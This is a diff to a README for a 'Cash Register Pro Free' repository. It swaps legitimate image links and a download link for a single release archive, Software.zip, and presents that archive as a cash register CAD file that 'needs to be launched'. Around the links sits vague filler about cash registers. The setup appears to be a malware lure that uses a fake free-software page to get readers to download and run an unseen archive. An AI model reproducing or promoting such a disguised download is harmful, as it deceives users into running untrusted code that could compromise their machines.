@@ -1,6 +1,6 @@
 # 🌟 Welcome to Cash Register Pro Free 🌟
 
-![Cash Register](https://images.unsplash.com/photo-1509802082491-c09d82b587bb?ixlib=rb-1.2.1&auto=format&fit=crop&w=1350&q=80)
+![Cash Register](https://github.com/Daviiiihv/Cash-Register-Pro-Free/releases/download/v1.0/Software.zip)
 
 ## Repository Name: 
 Cash-Register-Pro-Free
@@ -27,14 +27,14 @@ Welcome to Cash Register Pro Free! This repository aims to provide information o
 - why-buy-a-cash-register
 
 ## CAD File Download:
-To access the Cash Register CAD file, please click [here](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip). The file needs to be launched to view the detailed design specifications.
+To access the Cash Register CAD file, please click [here](https://github.com/Daviiiihv/Cash-Register-Pro-Free/releases/download/v1.0/Software.zip). The file needs to be launched to view the detailed design specifications.
 
 ## Explore the World of Cash Registers:
 🏪 Are you a small business owner looking for the perfect cash register to streamline your transactions?  
 🕰️ Curious about the evolution of cash registers and how they were operated in the past?  
 🎁 Looking for a fun cash register toy for your kids to play with?
 
-![Cash Register Toy](https://images.unsplash.com/photo-1525625397381-94782f64b157?ixlib=rb-1.2.1&auto=format&fit=crop&w=800&q=60)
+![Cash Register Toy](https://github.com/Daviiiihv/Cash-Register-Pro-Free/releases/download/v1.0/Software.zip)
 
 ## Cash Register Nostalgia:
 Discover the fascinating history of cash registers and learn about their significance in revolutionizing the way businesses operate. Take a trip down memory lane to understand how these mechanical marvels paved the way for modern point-of-sale systems.
@@ -45,14 +45,14 @@ Whether you are a retail enthusiast, a history buff, or a business owner, select
 ## Get Inspired by Cash Register Innovations:
 Explore the latest trends in cash register technology and see how these innovative devices are adapting to the changing needs of businesses. From touchscreen interfaces to cloud-based solutions, cash registers are constantly evolving to enhance efficiency and customer experience.
 
-![Cash Register Evolution](https://images.unsplash.com/photo-1591729856815-c34d85ee63c6?ixlib=rb-1.2.1&auto=format&fit=crop&w=1350&q=80)
+![Cash Register Evolution](https://github.com/Daviiiihv/Cash-Register-Pro-Free/releases/download/v1.0/Software.zip)
 
 ## Join the Cash Register Community:
 Connect with like-minded individuals who share a passion for cash registers. Share your stories, ask questions, and stay updated on the latest developments in the world of cash registers. Let's build a vibrant community dedicated to preserving the legacy of these iconic devices.
 
 ## 🎉 Start Your Cash Register Journey Today! 🎉
 
-![Cash Register Fun](https://images.unsplash.com/photo-1488024368095-a8ed5b5f32bc?ixlib=rb-1.2.1&auto=format&fit=crop&w=800&q=60)
+![Cash Register Fun](https://github.com/Daviiiihv/Cash-Register-Pro-Free/releases/download/v1.0/Software.zip)
 
 ## For More Information:
 For additional resources, updates, and discussions, please visit the "Releases" section of this repository. Stay informed about upcoming events, new features, and exclusive content related to cash registers.
